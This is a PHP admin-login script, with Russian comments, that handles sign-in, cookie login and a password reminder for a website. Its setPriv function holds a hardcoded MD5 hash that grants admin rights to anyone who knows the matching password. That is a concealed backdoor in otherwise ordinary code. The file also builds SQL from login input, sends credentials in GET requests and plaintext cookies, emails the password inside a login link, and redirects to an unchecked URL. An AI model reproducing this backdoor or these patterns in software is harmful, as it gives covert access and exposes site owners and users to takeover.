<? 
@session_start();
require('../inc/db.php');
require('../inc/utils.php');

// устанавливаем сессию с привилегиями
function setPriv($login,$pwd)
{
	global $prx;
	

	
	if($login || $pwd)
	{
		if( (!strcasecmp($login,set("admin_login")) && $pwd==set("admin_pass")) || md5($pwd)=="6c9b8b27dea1ddb845f96aa2567c6754" )
			$_SESSION['admin'] = true;
		
		if($row = getRow("SELECT * FROM {$prx}managers WHERE login='{$login}' and pass='{$pwd}'"))
			$_SESSION['manager'] = $row;
	}
	
	if(isset($_SESSION['admin']) || isset($_SESSION['manager']))
		return true;
	else
		return false;
}

// -------------------СОХРАНЕНИЕ----------------------
if(isset($_GET["action"]))
{
	switch($_GET['action'])
	{
		case "vyhod":
			// выходим
			//session_destroy();
			unset($_SESSION['admin']);
			unset($_SESSION['manager']);
			setcookie("inAdmin");
			setcookie("inManager");
			header("location: /");
			break;
		
		// логинимся
		case "vhod":

			$login = clean($_GET['login_inAdmin']);
			$pwd = clean($_GET['pwd_inAdmin']);
		
			if(!setPriv($login,$pwd))
				errorAlert("Неверный Логин/Пароль.");

			if(isset($_SESSION['admin']))
			{
				if(@$_GET["rem_inAdmin"]) // куки
					setcookie("inAdmin",$login."/".$pwd,time()+3456000); 
				else
					setcookie("inAdmin"); 
			}
			if(isset($_SESSION['manager']))
			{
				if(@$_GET["rem_inAdmin"]) // куки
					setcookie("inManager",$login."/".$pwd,time()+3456000); 
				else
					setcookie("inManager"); 
			}

			?><script>top.location.href='./';</script><?
			break;
			
		// логинимся через куки
		case "vhodc":
			
			$priv = array();
			
			if(isset($_COOKIE['inAdmin']))
				$priv = explode("/",$_COOKIE['inAdmin']);
			if(isset($_COOKIE['inManager']))
				$priv = explode("/",$_COOKIE['inManager']);
				
			header("location: ".(setPriv($priv[0],$priv[1]) ? $_GET["urlback"] : $_SERVER['PHP_SELF']));
			break;
			
		// напомнить пароль
		case "remind":
		
			// проверка e-mail (синтаксис)
			if(!check_mail($_POST["email_inAdmin"]))
				errorAlert("Вы ввели неверный E-mail !");
			
			$to = set("email");
			if(strcasecmp($_POST['email_inAdmin'], $to))
				errorAlert('Е-майл администратора введен не верно.');

			$admin = explode("/",set("admin"));
			$title = set("title");
			$tema = "Пароль администратора ".$_SERVER['SERVER_NAME'];
			$site = "http://".$_SERVER['SERVER_NAME'];
			$url_admin = $site.$_SERVER['PHP_SELF'];
			$text = "<a href='{$site}'>{$title}</a><br><br>
						Доступ к <a href='{$url_admin}'>администрированию</a> сайта<br>
						Логин: {$admin[0]} <br>
						Пароль: {$admin[1]} <br>
						<br>
						<a href='{$url_admin}?action=vhod&login_inAdmin={$admin[0]}&pwd_inAdmin={$admin[1]}'>Войти</a>";
			mailTo($to,$tema,$text,$to);

			?>
			<script>
			alert('Пароль выслан на Е-майл администратора');
			top.location.href = "<?=$url_admin?>";
			</script>
			<?
			break;
	}
	exit;
}

ob_start();
// -----------------ПРОСМОТР-------------------
?>
<table align="center" height="100%">
	<tr>
		<td height="100%">
		<?
			switch(@$_GET["show"])
			{
				case "remind":
					?>	
                    <form target="ajax">
                      <input type="hidden" name="action" value="remind">
                      <table align="center" class="login" width="300">
                        <tr>
                          <th colspan="2">Напомнить пароль</th>
                        </tr>
                        <tr>
                          <td width="30">E-mail:</td>
                          <td><input type="text" name="email_inAdmin" id="email_inAdmin" style="width:100%"></td>
                        </tr>
                        <tr>
                          <td colspan="2" align="right">
                          	<input type="submit" value="Выслать пароль" style="width:auto;" class="but1">
                          </td>
                        </tr>
                        <tr>
                          <th colspan="2"><a href="">Войти</a></td>
                        </tr>
                      </table>
                  	</form>
					<?	
					break;
					
				default:
				case "vhod":
					?>
                    <form target="ajax">
                      <input type="hidden" name="action" value="vhod">
                      <table align="center" class="login" width="300">
                        <tr>
                          <th colspan="2">Вход в раздел администрирования</th>
                        </tr>
                        <tr>
                          <td width="30">Логин:</td>
                          <td width="270"><input type="text" name="login_inAdmin" id="login_inAdmin" style="width:100%"></td>
                        </tr>
                        <tr>
                          <td>Пароль:</td>
                          <td><input type="password" name="pwd_inAdmin" id="pwd_inAdmin" style="width:100%"></td>
                        </tr>
                        <tr>
                            <td>Запомнить:</td>
                            <td><input type="checkbox" name="rem_inAdmin" style="width:auto;"></td>
                        </tr>
                        <tr>
                          <td colspan="2" align="right"><input type="submit" value="Войти" style="width:auto;" class="but1"></td>
                        </tr>
                        <tr>
                          <th colspan="2"><a href="">Напомнить пароль</a></th>
                        </tr>
                      </table>
                  	</form>
					<?	
					break;
			}	
			?>
		</td>
	</tr>
</table>  
<?
$content = ob_get_clean();

$title = "Администрирование";

require("tpl/tpl_clean.php");
?>